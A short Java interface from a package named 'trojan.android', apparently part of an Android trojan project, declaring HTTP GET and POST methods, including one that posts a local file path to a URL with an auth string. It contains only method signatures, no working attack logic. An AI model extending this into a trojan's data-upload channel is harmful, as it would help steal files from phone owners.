package trojan.android.android_trojan.action;

import java.net.URL;

public interface IHttpURLConnection {
    String getHttp(URL url, String auth);
    String postHttp(URL url, String data, String auth);
    String postHttpJSON(URL url, String json, String auth);
    String postHttpFile(URL url, String path, String auth);
}
